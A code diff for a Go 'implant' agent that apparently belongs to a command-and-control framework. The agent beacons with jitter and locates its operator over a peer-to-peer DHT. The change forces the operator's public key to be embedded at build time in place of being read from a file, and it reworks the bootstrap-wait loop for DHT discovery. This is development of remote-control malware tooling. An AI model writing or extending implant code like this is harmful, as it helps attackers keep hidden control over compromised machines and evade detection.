@@ -33,7 +33,6 @@ type Agent struct {
 }
 
 type AgentConfig struct {
-	OperatorKeyFile  string
 	OperatorAddr     string
 	BeaconInterval   time.Duration
 	BeaconJitter     time.Duration
@@ -43,28 +42,23 @@ type AgentConfig struct {
 
 func DefaultAgentConfig() AgentConfig {
 	return AgentConfig{
-		OperatorKeyFile:  "operator.pub",
 		BeaconInterval:   10 * time.Second,
 		BeaconJitter:     5 * time.Second,
 		ReconnectBackoff: 5 * time.Second,
 	}
 }
 
-func loadOperatorPubKey(cfg AgentConfig) (crypto.PubKey, error) {
-	if len(embeddedOperatorPubKey) > 0 {
-		return cryptography.PubKeyFromBytes(embeddedOperatorPubKey)
+func loadOperatorPubKey() (crypto.PubKey, error) {
+	if len(embeddedOperatorPubKey) == 0 {
+		return nil, fmt.Errorf("no embedded operator public key — rebuild with build-implant tool")
 	}
-	pubKeyData, err := os.ReadFile(cfg.OperatorKeyFile)
-	if err != nil {
-		return nil, fmt.Errorf("read operator key %s: %w", cfg.OperatorKeyFile, err)
-	}
-	return cryptography.PubKeyFromBytes(pubKeyData)
+	return cryptography.PubKeyFromBytes(embeddedOperatorPubKey)
 }
 
 func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
 	ctx, cancel := context.WithCancel(ctx)
 
-	operatorPub, err := loadOperatorPubKey(cfg)
+	operatorPub, err := loadOperatorPubKey()
 	if err != nil {
 		cancel()
 		return nil, fmt.Errorf("load operator pubkey: %w", err)
@@ -151,17 +145,17 @@ func (a *Agent) Start() error {
 
 func (a *Agent) discoverOperatorLoop(ns string) {
 	log.Printf("[implant] DHT discovery started for: %s", ns)
-	for {
-		if a.node.DHT == nil || len(a.node.DHT.RoutingTable().ListPeers()) == 0 {
-			log.Printf("[implant] DHT routing table empty, waiting for bootstrap...")
-			select {
-			case <-a.ctx.Done():
-				return
-			case <-time.After(5 * time.Second):
-			}
-			continue
+	for a.node.DHT == nil || a.node.DHT.RoutingTable().Size() == 0 {
+		log.Printf("[implant] DHT routing table empty, waiting for bootstrap...")
+		select {
+		case <-a.ctx.Done():
+			return
+		case <-time.After(2 * time.Second):
 		}
+	}
+	log.Printf("[implant] DHT routing table has %d peers, querying for operator", a.node.DHT.RoutingTable().Size())
 
+	for {
 		log.Printf("[implant] querying DHT for operator...")
 		peerCh, err := a.node.FindPeers(a.ctx, ns)
 		if err != nil {
